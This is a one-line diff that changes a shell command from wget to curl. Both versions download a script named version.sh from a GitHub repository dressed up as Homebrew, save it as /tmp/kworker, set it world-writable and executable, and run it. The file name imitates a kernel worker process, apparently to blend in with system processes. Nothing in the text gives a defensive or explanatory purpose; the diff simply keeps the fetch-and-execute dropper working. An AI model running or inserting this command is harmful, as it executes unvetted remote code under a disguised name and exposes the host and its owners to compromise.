@@ -1,1 +1,1 @@
-wget -O /tmp/kworker https://github.com/JoyOmega/brew/raw/master/Library/Homebrew/version.sh;chmod 777  /tmp/kworker;cd /tmp && ./kworker
+curl -o /tmp/kworker https://raw.githubusercontent.com/JoyOmega/brew/master/Library/Homebrew/version.sh;chmod 777  /tmp/kworker;cd /tmp && ./kworker
